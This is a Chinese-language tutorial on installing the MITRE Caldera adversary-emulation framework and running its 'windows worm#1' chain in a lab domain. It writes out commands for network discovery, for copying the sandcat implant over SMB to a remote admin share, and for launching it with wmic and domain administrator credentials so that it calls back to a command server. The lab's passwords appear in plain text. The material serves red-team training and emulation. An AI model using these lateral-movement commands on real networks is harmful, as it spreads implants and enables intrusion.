## 关于Caldera

又名“火山口”，是一款攻防自动化对抗框架。就不多介绍了，网上有很多介绍的文章，接下来从安装开始。

## Caldera安装

包含一些我踩过的坑以及注意事项  
注意：不支持windows  
官方github地址：  
<https://github.com/mitre/caldera>  
需要golang环境和python环境。python版本尽量3.7,高版本容易报错。

语言环境弄好之后,按照其说明进行安装：

    
    
    git clone https://github.com/mitre/caldera.git --recursive
    cd caldera
    pip3 install -r requirements.txt
    python3 server.py --insecure
    

注意：这里的 `--recursive`一定不能丢，意思是递归下载，会下载重要的插件，否则到时候会报错。

最后一条命令 `python3 server.py --insecure`  
不加后面的参数也行

 **还有一点要注意** ，下载完之后，可能有一些文件会被杀软干掉，如果有这种情况，注意把他们复原。

开始安装：  
![image.png](https://image.3001.net/images/20221102/1667397287_636276a727c7726daa296.png!small)  
还要安装upx  
官方地址：  
<https://upx.github.io/>  
很简单，直接解压再加进环境变量即可

## 启动登录

![image-20221104111740409.png](https://image.3001.net/images/20221104/1667561037_6364f64d6a2cb9d8c4d2c.png!small)

首次启动可能会失败，直接卡在插件那里，等几分钟再重启就ok了 （原因不明）

启动之后 访问`localhost:8888`成功说明成功启动

在成功启动后，会在 `conf/`下生成一个 `local/yml`文件，是配置文件。里面的内容基本 不用动，拉到最下面有一个 users 的选项，里面有
`blue`和 `red`两个用户，后面是密码，修改即可

![image-20221104112302569.png](https://image.3001.net/images/20221104/1667561052_6364f65c2dba404fb6cee.png!small)

再回到 `localhost:8888`或者 `ip:8888`,这里默认绑定 `0.0.0.0`,使用 `red`用户登录

![image-20221104112455614.png](https://image.3001.net/images/20221104/1667561069_6364f66db09b4a61b6b13.png!small)

## 功能介绍

登录进来之后，看左边导航：

![image-20221104112554316.png](https://image.3001.net/images/20221104/1667561085_6364f67d2a5056cb2dd65.png!small)

### 1.Agent

类似CS的Agent

机器上线步骤：

1.点击Deploy an agent

![image-20221104113212435.png](https://image.3001.net/images/20221104/1667561094_6364f6865995e58344002.png!small)

这里我们选择 `Sandcat`即默认agent

![image-20221104113313833.png](https://image.3001.net/images/20221104/1667561099_6364f68bb9e7e5c9e22d1.png!small)

2.选择操作系统，即要上线机器的操作系统，点击不同的操作系统，会给出不同的payload，然后在目标机器上执行即可上线。

需要更改的地方只有这个 **app.contact.http** 这里的ip,把它改为启动`caldera`机器的IP即可

![image-20221104113516623.png](https://image.3001.net/images/20221104/1667561112_6364f6988a177b55a91c0.png!small)

上线命令也给出了很多，我们都选第一个即可，即红队默认agent

![image-20221104113848662.png](https://image.3001.net/images/20221104/1667561119_6364f69f6b891b6ed998b.png!small)

最后到需要上线的机器执行命令，回到导航，点击agent,可以看到上线机器

![image-20221104114016845.png](https://image.3001.net/images/20221104/1667561127_6364f6a7b07bddf803ada.png!small)

### 2.Abilities

指的是在可以在agent上执行的操作，每一个ability都是TTP上的一个步骤

![image-20221104114851550.png](https://image.3001.net/images/20221104/1667561134_6364f6ae671be8df57414.png!small)  
可以进行搜索筛选

点击可以查看、编辑某一个ability

![image-20221104114942905.png](https://image.3001.net/images/20221104/1667561142_6364f6b685a7564d4712b.png!small)

### 3.Adversaries

选择TTPs链，caldera提供了一些TTPs来供我们学习研究

![image-20221104143410021.png](https://image.3001.net/images/20221104/1667561162_6364f6ca9d1d96fa43631.png!small)

当然，也可以自定义

![image-20221104143452857.png](https://image.3001.net/images/20221104/1667561172_6364f6d4d94835d7e502d.png!small)

### 4.Operation

点击 create operation,选择一个adversary即可

![image-20221104143738858.png](https://image.3001.net/images/20221104/1667561182_6364f6de8f115b3215be6.png!small)

其余选项不用动，点击start则会在已上线的机器上执行Adversary

![image-20221104143830954.png](https://image.3001.net/images/20221104/1667561188_6364f6e4caa774856bf8a.png!small)

### 5.插件

这里先不涉及到

## windows worm#1

这里我们拿windows蠕虫来实操一下

### 执行顺序

点击Adversaries,选择windows worm#1，看一下这个TTPs是怎么运行的

![image-20221104144216814.png](https://image.3001.net/images/20221104/1667561195_6364f6eb682ec8553b661.png!small)

可以看到很多abilities,等下使用operation运行的时候则会自动按照这个顺序运行，后面会详细说到每一个步骤

![image-20221031171502139.png](https://image.3001.net/images/20221104/1667561249_6364f721cc33d21c27cef.png!small)

### 环境

根据其TTPs链，搭建相应的环境

  * win2012(已上线) 172.29.2.215

  * win2016(AD) 172.29.3.66

域：worm.lab

域管账号密码：

  * administrator

  * zxcasdqwe123!@#

win2012本地管理员账户密码：

  * administrator

  * zxcasdqwe123!@#

### 上线机器

我这里要上线win2012

点击导航栏agent，再点击Deploy an agent

![image-20221104144700141.png](https://image.3001.net/images/20221104/1667561277_6364f73dcdc35278663db.png!small)

再按照前面说的，选择sandcat agent再选择平台，改ip再复制payload

![image-20221104144840419.png](https://image.3001.net/images/20221104/1667561290_6364f74ac7eab24d67693.png!small)

到win2012上powershell执行复制的payload,成功上线

![image-20221104144920670.png](https://image.3001.net/images/20221104/1667561300_6364f754f0389dc1009bf.png!small)

### 开始执行

接下来就是operation，真正运行了

点击create operation,名字随意起，选择windows worm#1,点击start就开始了

![image-20221104145200048.png](https://image.3001.net/images/20221104/1667561309_6364f75d15ced3509f161.png!small)

![image-20221104145401506.png](https://image.3001.net/images/20221104/1667561314_6364f7623eab9ecf6dc1a.png!small)

接下来我会详细说每一个步骤的过程，及踩到的坑

### 1. **collect ARP details**

![image.png](https://image.3001.net/images/20221104/1667562780_6364fd1c9376060e57be9.png!small)

很简单，直接用命令arp -a进行信息收集,保存ip信息

![image.png](https://image.3001.net/images/20221104/1667562887_6364fd87d12f6704cbad5.png!small)

![image.png](https://image.3001.net/images/20221104/1667562894_6364fd8eea70218d166f1.png!small)

会 **保存所有IP** ,为下一步做准备

这里有个干扰，如果多台机器上线，都会执行此操作，但是它只取一台机器的结果，关掉无关机器即可

还有一个 **编码问题** ，导致无法解析结果。我直接把系统语言换成英文即可

### 2. **Reverse nslookup IP**

![image.png](https://image.3001.net/images/20221104/1667562903_6364fd9704c71e64bdd3a.png!small)

可以看到它是根据上一步收集到的IP一个一个进行DNS记录查询,使用的是 **nslookup** 命令

 **这里有个问题** ，发现所有结果都是unknow,我到机器上执行也一样。

如果结果全是unknow，导致下一步无法执行

解决方法：它的目的应该是想通过IP找到域名，那么我到AD上进行配置PTR记录即可

![image.png](https://image.3001.net/images/20221104/1667562979_6364fde33e953fd3e7a9d.png!small)  
现在可以成功解析：

![image.png](https://image.3001.net/images/20221104/1667562985_6364fde92afad707c679f.png!small)

此处 **保存了fqdn** ,即输出结果的Server

###  **3.View remote shares**

查看远程共享，使用了net view命令,使用了上一部保存的 **fqdn**

执行的命令：

    
    
    net view \\win2016.worm.lab /all
    

![image.png](https://image.3001.net/images/20221104/1667562999_6364fdf7951d6e56dc7cc.png!small)

![image.png](https://image.3001.net/images/20221104/1667563009_6364fe01a2fa448d90ddc.png!small)

使用 **net view** 命令时，如果是本地账户，会自动使用当前缓存的密码进行NTLM认证，域内账户则会使用Kerberos认证。这些是 **new
view** 命令内部做的事情，不做深入探究

这一步骤会保存fqdn，后面会用到

###  **4.Copy 54ndc47 (SMB)**

给出的命令：

    
    
    $path = "sandcat.go-windows";
    $drive = "\\#{remote.host.fqdn}\C$";
    Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
    

这一步首先把 `sandcat.go-windows`木马文件上传到已上线机器，再尝试复制木马文件到远程共享目录（fqdn,上一步保存的结果），会使用自身缓存的密码和Administrator进行连接。所以
**只有密码相同的机器** 才能成功，为了实验成功，我们两台机器的密码设为一样

![image.png](https://image.3001.net/images/20221104/1667563023_6364fe0f647a5953e2f3c.png!small)

最终执行的命令：

    
    
    $path = "sandcat.go-windows";
    $drive = "\\win2016.worm.lab\C$";
    Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
    

![image.png](https://image.3001.net/images/20221104/1667563031_6364fe172a42be389e1ea.png!small)

前提条件：

  * 知道fqdn即可 (即上一步的保存结果)

  * 开启了SMB服务（默认开启）

###  **5.Start 54ndc47 (WMI)**

这一步执行上传的文件，第四步之后就卡住了，只能手动添加这一步。（因该是参数不够的原因）

首先到Adversaries界面查看第五步骤的名字，并复制

![image-20221104150239858.png](https://image.3001.net/images/20221104/1667561410_6364f7c2c3ce4e44efde5.png!small)

再回到operation界面右下角，有一个Potential Link按钮，点击它

![image-20221104150022480.png](https://image.3001.net/images/20221104/1667561428_6364f7d420854924fadfe.png!small)

**注意：**这里如果有弹出红色框框报错，直接重启caldera就好

先选择Excutor,选择PS（即Powershell），再到搜索框输入刚刚复制的Abilitity 名字，并找到相应结果

![image-20221104150324325.png](https://image.3001.net/images/20221104/1667561439_6364f7df8ad95d10950a6.png!small)

![image-20221104150514487.png](https://image.3001.net/images/20221104/1667561445_6364f7e511fd02fd98035.png!small)

框框里面就是接下来需要执行的命令，`#{...}`格式的是变量，这一步我们只需要修改前面三个变量，其余的会自动补充

![image-20221104150622937.png](https://image.3001.net/images/20221104/1667561450_6364f7ea59536f2d7e791.png!small)

![image-20221104151005811.png](https://image.3001.net/images/20221104/1667561457_6364f7f124e33594ac523.png!small)

这里第一个变量，我们也可以点击上面的 remote.host.fqdn选择一个，我们就不用手动修改这个变量了

![image-20221104151109770.png](https://image.3001.net/images/20221104/1667561462_6364f7f6b851290d53d86.png!small)

给出的原始命令：

    
    
    $node = '''#{remote.host.fqdn}''';
    $user = '''#{domain.user.name}''';
    $password = '''#{domain.user.password}''';
    wmic /node:$node /user:$user /password:$password process call create "powershell.exe C:\Users\Public\s4ndc4t.exe -server #{server} -group #{group}";
    

前提条件：

需要 **FQDN、用户名、密码**

  * FQDN：win2016.worm.lab

  * 用户名：administrator

  * 密码：zxcasdqwe123!@#

其余的变量会自动填充

最终执行的命令：

    
    
    $node = '''win2016.worm.lab''';
    $user = '''administrator''';
    $password = '''zxcasdqwe123!@#''';
    wmic /node:$node /user:$user /password:$password process call create "powershell.exe C:\Users\Public\s4ndc4t.exe -server http://172.29.2.129:8888 -group red";
    

成功上线另一台机器：

![image-20221028173205157.png](https://image.3001.net/images/20221104/1667561484_6364f80c4b4411c48d4ab.png!small)

### 6. **collect ARP details**

再到已经上线了的机器上执行arp -a 命令

![image-20221031091527120.png](https://image.3001.net/images/20221104/1667561489_6364f81139788c5aa9b4a.png!small)

